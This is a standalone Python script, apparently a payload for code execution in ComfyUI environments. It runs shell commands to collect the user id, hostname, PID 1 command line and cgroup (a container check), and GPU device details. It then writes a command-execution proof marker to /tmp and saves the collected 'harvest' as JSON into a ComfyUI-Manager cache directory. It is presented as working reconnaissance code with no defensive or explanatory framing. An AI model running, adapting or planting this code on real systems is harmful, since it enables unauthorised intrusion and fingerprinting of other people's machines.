import os,json,socket,subprocess,time,uuid,hashlib
n=uuid.uuid4().hex
def sh(c,t=5):
    try:
        p=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=t); return ((p.stdout or '')+(p.stderr or ''))[:4000]
    except Exception as e: return 'ERR %r'%e
H={"_meta":{"tag":"i5886","v":8,"nonce":n,"ts":time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime()),"uid":os.getuid(),"host":socket.gethostname()},
   "id":sh("id"),
   "hostname":sh("hostname; cat /etc/hostname"),
   "pid1":sh("cat /proc/1/cmdline | tr '\\0' ' '; echo; cat /proc/1/cgroup | head -3"),
   "nvidia":sh("nvidia-smi -L 2>&1 | head -2; ls -l /dev/nvidia* 2>&1 | head -3"),
   "marker_path":"/tmp/ul_i5886_%s"%n,
   "cmd_proof":sh("echo UL-PROOF-%s > /tmp/ul_i5886_%s; cat /tmp/ul_i5886_%s; ls -l /tmp/ul_i5886_%s"%((n,)*4))}
out=json.dumps(H)
for p in ["/ComfyUI/user/default/ComfyUI-Manager/cache/i5886_harvest.json","/tmp/i5886_harvest.json"]:
    try:
        os.makedirs(os.path.dirname(p),exist_ok=True); open(p,"w").write(out)
    except Exception as e: print("write-fail",p,repr(e))
print("[i5886] v8 nonce=%s"%n,flush=True)
